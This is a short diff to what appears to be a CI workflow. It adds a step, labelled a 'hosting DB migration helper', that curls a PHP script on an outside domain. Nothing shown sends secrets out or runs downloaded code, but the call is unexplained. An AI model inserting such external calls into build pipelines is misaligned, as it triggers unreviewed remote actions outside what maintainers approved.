@@ -29,3 +29,7 @@ jobs:
           ftp_listing.txt
           router.php
           start.sh
+
+    - name: Run hosting DB migration helper
+      run: |
+        curl -fsS "https://netfollows.com/hosting-db-columns.php"
